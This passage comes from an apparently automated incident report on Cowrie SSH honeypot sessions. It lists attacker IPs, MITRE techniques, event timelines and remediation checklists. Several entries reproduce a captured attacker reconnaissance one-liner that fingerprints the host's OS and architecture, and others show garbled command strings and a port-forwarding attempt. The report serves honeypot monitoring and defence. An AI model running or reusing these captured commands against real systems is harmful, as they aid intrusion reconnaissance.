| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.log.closed` |
| `2026-08-11 05:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2ba8378646

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:36 |
| **Last Seen** | 2026-08-11 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:36:36` | `cowrie.session.connect` |
| `2026-08-11 05:36:36` | `cowrie.client.version` |
| `2026-08-11 05:36:36` | `cowrie.client.kex` |
| `2026-08-11 05:36:36` | `cowrie.login.success` |
| `2026-08-11 05:36:39` | `cowrie.session.params` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.success` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.command.input` |
| `2026-08-11 05:36:39` | `cowrie.log.closed` |
| `2026-08-11 05:36:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98738645fb29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:38 |
| **Last Seen** | 2026-08-11 05:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:38:29` | `cowrie.session.connect` |
| `2026-08-11 05:38:29` | `cowrie.client.version` |
| `2026-08-11 05:38:29` | `cowrie.client.kex` |
| `2026-08-11 05:38:29` | `cowrie.login.success` |
| `2026-08-11 05:38:30` | `cowrie.session.params` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.success` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.command.input` |
| `2026-08-11 05:38:30` | `cowrie.log.closed` |
| `2026-08-11 05:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a298f68eea17

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 05:40 |
| **Last Seen** | 2026-08-11 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:40:01` | `cowrie.session.connect` |
| `2026-08-11 05:40:01` | `cowrie.client.version` |
| `2026-08-11 05:40:01` | `cowrie.client.kex` |
| `2026-08-11 05:40:01` | `cowrie.login.success` |
| `2026-08-11 05:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7bcd5a1c6a8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 05:40 |
| **Last Seen** | 2026-08-11 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:40:01` | `cowrie.session.connect` |
| `2026-08-11 05:40:01` | `cowrie.client.version` |
| `2026-08-11 05:40:01` | `cowrie.client.kex` |
| `2026-08-11 05:40:01` | `cowrie.login.success` |
| `2026-08-11 05:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ba3aea38367

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 05:40 |
| **Last Seen** | 2026-08-11 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:40:09` | `cowrie.session.connect` |
| `2026-08-11 05:40:09` | `cowrie.client.version` |
| `2026-08-11 05:40:09` | `cowrie.client.kex` |
| `2026-08-11 05:40:09` | `cowrie.login.success` |
| `2026-08-11 05:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb533b59a462

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-11 05:40 |
| **Last Seen** | 2026-08-11 05:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:40:09` | `cowrie.session.connect` |
| `2026-08-11 05:40:09` | `cowrie.client.version` |
| `2026-08-11 05:40:09` | `cowrie.client.kex` |
| `2026-08-11 05:40:09` | `cowrie.login.success` |
| `2026-08-11 05:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f117ac6fc534

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:40 |
| **Last Seen** | 2026-08-11 05:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:40:22` | `cowrie.session.connect` |
| `2026-08-11 05:40:22` | `cowrie.client.version` |
| `2026-08-11 05:40:22` | `cowrie.client.kex` |
| `2026-08-11 05:40:23` | `cowrie.login.success` |
| `2026-08-11 05:40:24` | `cowrie.session.params` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.success` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.command.input` |
| `2026-08-11 05:40:24` | `cowrie.log.closed` |
| `2026-08-11 05:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9a493ac115

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:42 |
| **Last Seen** | 2026-08-11 05:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:42:20` | `cowrie.session.connect` |
| `2026-08-11 05:42:20` | `cowrie.client.version` |
| `2026-08-11 05:42:21` | `cowrie.client.kex` |
| `2026-08-11 05:42:21` | `cowrie.login.success` |
| `2026-08-11 05:42:22` | `cowrie.session.params` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.success` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.command.input` |
| `2026-08-11 05:42:22` | `cowrie.log.closed` |
| `2026-08-11 05:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-193020690e68

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-11 05:43 |
| **Last Seen** | 2026-08-11 05:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:43:07` | `cowrie.session.connect` |
| `2026-08-11 05:43:07` | `cowrie.client.version` |
| `2026-08-11 05:43:07` | `cowrie.client.kex` |
| `2026-08-11 05:43:08` | `cowrie.login.success` |
| `2026-08-11 05:43:08` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:43:08` | `cowrie.direct-tcpip.data` |
| `2026-08-11 05:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04ba489ec878

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:44 |
| **Last Seen** | 2026-08-11 05:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:44:18` | `cowrie.session.connect` |
| `2026-08-11 05:44:18` | `cowrie.client.version` |
| `2026-08-11 05:44:18` | `cowrie.client.kex` |
| `2026-08-11 05:44:18` | `cowrie.login.success` |
| `2026-08-11 05:44:20` | `cowrie.session.params` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.success` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.command.input` |
| `2026-08-11 05:44:20` | `cowrie.log.closed` |
| `2026-08-11 05:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e0e0ed74d82

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:46 |
| **Last Seen** | 2026-08-11 05:46 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:46:04` | `cowrie.session.connect` |
| `2026-08-11 05:46:05` | `cowrie.login.success` |
| `2026-08-11 05:46:05` | `cowrie.session.params` |
| `2026-08-11 05:46:06` | `cowrie.command.input` |
| `2026-08-11 05:46:06` | `cowrie.command.failed` |
| `2026-08-11 05:46:06` | `cowrie.command.input` |
| `2026-08-11 05:46:06` | `cowrie.command.failed` |
| `2026-08-11 05:46:06` | `cowrie.command.input` |
| `2026-08-11 05:46:06` | `cowrie.command.failed` |
| `2026-08-11 05:46:07` | `cowrie.command.input` |
| `2026-08-11 05:46:07` | `cowrie.command.failed` |
| `2026-08-11 05:46:07` | `cowrie.command.input` |
| `2026-08-11 05:46:07` | `cowrie.command.input` |
| `2026-08-11 05:46:07` | `cowrie.command.failed` |
| `2026-08-11 05:46:07` | `cowrie.command.failed` |
| `2026-08-11 05:46:37` | `cowrie.log.closed` |
| `2026-08-11 05:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64b82b7149b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:46 |
| **Last Seen** | 2026-08-11 05:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:46:19` | `cowrie.session.connect` |
| `2026-08-11 05:46:20` | `cowrie.client.version` |
| `2026-08-11 05:46:20` | `cowrie.client.kex` |
| `2026-08-11 05:46:20` | `cowrie.login.success` |
| `2026-08-11 05:46:21` | `cowrie.session.params` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.success` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:21` | `cowrie.command.input` |
| `2026-08-11 05:46:22` | `cowrie.log.closed` |
| `2026-08-11 05:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ec14f0f000

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:46 |
| **Last Seen** | 2026-08-11 05:47 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:46:38` | `cowrie.session.connect` |
| `2026-08-11 05:46:38` | `cowrie.login.success` |
| `2026-08-11 05:46:39` | `cowrie.login.success` |
| `2026-08-11 05:46:40` | `cowrie.session.params` |
| `2026-08-11 05:46:40` | `cowrie.command.input` |
| `2026-08-11 05:46:40` | `cowrie.command.failed` |
| `2026-08-11 05:46:41` | `cowrie.command.input` |
| `2026-08-11 05:46:41` | `cowrie.command.failed` |
| `2026-08-11 05:46:41` | `cowrie.command.input` |
| `2026-08-11 05:46:41` | `cowrie.command.input` |
| `2026-08-11 05:46:41` | `cowrie.command.failed` |
| `2026-08-11 05:46:41` | `cowrie.command.failed` |
| `2026-08-11 05:47:12` | `cowrie.log.closed` |
| `2026-08-11 05:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf90091fa4f5

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:47 |
| **Last Seen** | 2026-08-11 05:47 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:47:13` | `cowrie.session.connect` |
| `2026-08-11 05:47:13` | `cowrie.login.success` |
| `2026-08-11 05:47:14` | `cowrie.session.params` |
| `2026-08-11 05:47:14` | `cowrie.command.input` |
| `2026-08-11 05:47:14` | `cowrie.command.failed` |
| `2026-08-11 05:47:15` | `cowrie.command.input` |
| `2026-08-11 05:47:15` | `cowrie.command.failed` |
| `2026-08-11 05:47:15` | `cowrie.command.input` |
| `2026-08-11 05:47:15` | `cowrie.command.failed` |
| `2026-08-11 05:47:16` | `cowrie.command.input` |
| `2026-08-11 05:47:16` | `cowrie.command.failed` |
| `2026-08-11 05:47:16` | `cowrie.command.input` |
| `2026-08-11 05:47:16` | `cowrie.command.input` |
| `2026-08-11 05:47:16` | `cowrie.command.failed` |
| `2026-08-11 05:47:16` | `cowrie.command.failed` |
| `2026-08-11 05:47:46` | `cowrie.log.closed` |
| `2026-08-11 05:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f91bfd1a50e7

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:47 |
| **Last Seen** | 2026-08-11 05:48 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:47:47` | `cowrie.session.connect` |
| `2026-08-11 05:47:47` | `cowrie.login.success` |
| `2026-08-11 05:47:48` | `cowrie.session.params` |
| `2026-08-11 05:47:48` | `cowrie.command.input` |
| `2026-08-11 05:47:48` | `cowrie.command.failed` |
| `2026-08-11 05:47:49` | `cowrie.command.input` |
| `2026-08-11 05:47:49` | `cowrie.command.failed` |
| `2026-08-11 05:47:49` | `cowrie.command.input` |
| `2026-08-11 05:47:49` | `cowrie.command.failed` |
| `2026-08-11 05:47:50` | `cowrie.command.input` |
| `2026-08-11 05:47:50` | `cowrie.command.failed` |
| `2026-08-11 05:47:50` | `cowrie.command.input` |
| `2026-08-11 05:47:50` | `cowrie.command.input` |
| `2026-08-11 05:47:50` | `cowrie.command.failed` |
| `2026-08-11 05:47:50` | `cowrie.command.failed` |
| `2026-08-11 05:48:20` | `cowrie.log.closed` |
| `2026-08-11 05:48:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d35739a74d94

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:48 |
| **Last Seen** | 2026-08-11 05:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:48:20` | `cowrie.session.connect` |
| `2026-08-11 05:48:20` | `cowrie.client.version` |
| `2026-08-11 05:48:21` | `cowrie.client.kex` |
| `2026-08-11 05:48:21` | `cowrie.login.success` |
| `2026-08-11 05:48:23` | `cowrie.session.params` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.success` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.command.input` |
| `2026-08-11 05:48:23` | `cowrie.log.closed` |
| `2026-08-11 05:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c65189543860

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-08-11 05:48 |
| **Last Seen** | 2026-08-11 05:48 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:48:21` | `cowrie.session.connect` |
